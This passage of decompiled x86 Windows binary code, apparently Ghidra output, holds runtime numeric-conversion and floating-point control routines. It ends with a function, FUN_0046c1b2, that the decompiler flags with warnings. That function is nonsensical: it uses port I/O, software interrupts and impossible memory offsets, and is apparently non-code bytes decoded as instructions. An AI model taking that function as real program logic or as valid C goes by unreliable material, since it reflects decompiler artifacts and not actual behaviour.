      uVar8 = (param_5[2] * 2 | param_5[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_5 = uVar3;
      param_5[1] = uVar9;
      param_5[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_5 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_5[1] = uVar10;
        if (bVar5) {
          param_5[2] = uVar8 + 1;
        }
      }
      uVar10 = param_5[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_5[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_5[1] = uVar10;
      if (bVar4) {
        param_5[2] = param_5[2] + 1;
      }
      param_5[2] = param_5[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_5[2] * 2 | uVar10 >> 0x1f;
      *param_5 = uVar1;
      param_5[1] = uVar11;
      param_5[2] = uVar10;
      param_2 = (uint)*param_3;
      uVar2 = uVar1 + param_2;
      if ((uVar2 < uVar1) || (uVar2 < param_2)) {
        bVar4 = true;
      }
      *param_5 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        param_2 = 0;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          param_2 = 1;
        }
        param_5[1] = uVar2;
        if (param_2 != 0) {
          param_5[2] = uVar10 + 1;
        }
      }
      param_4 = param_4 + -1;
      param_3 = param_3 + 1;
    } while (param_4 != 0);
  }
  while (param_5[2] == 0) {
    param_5[2] = param_5[1] >> 0x10;
    param_2 = *param_5 << 0x10;
    sVar6 = sVar6 + -0x10;
    param_5[1] = param_5[1] << 0x10 | *param_5 >> 0x10;
    *param_5 = param_2;
  }
  uVar2 = param_5[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_5;
    sVar6 = sVar6 + -1;
    *param_5 = uVar10 * 2;
    param_2 = param_5[1] >> 0x1f;
    uVar2 = param_5[2] * 2;
    param_5[1] = param_5[1] * 2 | uVar10 >> 0x1f;
    param_5[2] = uVar2 | param_2;
  }
  *(short *)((int)param_5 + 10) = sVar6;
  FUN_0040a982(uVar7 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_0041bb92(void)

{
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004209b0,8);
  if (DAT_00425778 != 0) {
    if (((*(byte *)(unaff_EBP + 8) & 0x40) == 0) || (DAT_004239b4 == 0)) {
      *(uint *)(unaff_EBP + 8) = *(uint *)(unaff_EBP + 8) & 0xffffffbf;
      MXCSR = *(undefined4 *)(unaff_EBP + 8);
    }
    else {
      *(undefined4 *)(unaff_EBP + -4) = 0;
      MXCSR = *(undefined4 *)(unaff_EBP + 8);
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    }
  }
  return;
}



void Unwind_0041bc10(void)

{
  FUN_0040b6ac();
  return;
}



// WARNING: Variable defined which should be unmapped: param_9
// WARNING: Type propagation algorithm not settling

void __fastcall
FUN_0046c1b2(int param_1,int param_2,undefined param_3,undefined param_4,undefined param_5,
            undefined param_6,undefined4 param_7,undefined param_8,undefined4 param_9)

{
  longlong lVar1;
  code *pcVar2;
  undefined6 uVar3;
  char cVar4;
  byte *pbVar6;
  byte *pbVar8;
  byte **ppbVar9;
  int unaff_EBX;
  undefined4 *unaff_ESI;
  int *unaff_EDI;
  undefined2 uVar10;
  byte bVar5;
  char *pcVar7;
  
  out(*unaff_ESI,(short)param_2);
  uVar3 = *(undefined6 *)(param_1 + -0x147ea41b);
  uVar10 = (undefined2)((uint6)uVar3 >> 0x20);
  pbVar6 = (byte *)((int)uVar3 + 0x21d0848b + (uint)((undefined *)0x3 < &stack0xfffffffc));
  *(undefined *)(unaff_EBX + 0x51cb030e) = 0xff;
  bVar5 = (byte)((uint6)uVar3 >> 0x20);
  cVar4 = bVar5 + 0x8b;
  pcVar7 = (char *)CONCAT31((int3)(CONCAT22((short)((uint)unaff_EBX >> 0x10),uVar10) >> 8),cVar4);
  if (cVar4 == '\0' || SCARRY1(bVar5,-0x75) != cVar4 < '\0') {
    *pcVar7 = *pcVar7 + cVar4 + (0x74 < bVar5);
    return;
  }
  ppbVar9 = (byte **)(param_2 + *unaff_EDI);
  while (*ppbVar9 + ((uint)pcVar7 | 0xc033fb00) != (byte *)0x0) {
    pbVar8 = *ppbVar9;
    do {
      pbVar8 = pbVar8 + (int)pbVar6;
    } while (pbVar8 != (byte *)0x0);
    LOCK();
    *pbVar6 = *pbVar6 | (byte)((uint)ppbVar9 >> 8);
    UNLOCK();
    *unaff_EDI = 0;
    pcVar7 = (char *)0x0;
    unaff_EDI = unaff_EDI + 1;
    ppbVar9 = (byte **)&DAT_00000006;
  }
  lVar1 = (longlong)*(int *)((int)ppbVar9 + -0x363a8afa) * -0x67;
  cVar4 = (int)lVar1 != lVar1;
  if (-1 < (int)(pbVar6 + -1)) {
    DAT_3b085f47 = (char)lVar1 + (char)((uint)(pbVar6 + -1) >> 8);
    return;
  }
  pcVar2 = (code *)swi(4);
  if ((bool)cVar4) {
    (*pcVar2)(uVar10);
  }
  *(char *)(unaff_ESI + -0x128cd998) = *(char *)(unaff_ESI + -0x128cd998) + -0x80 + cVar4;
  return;
}


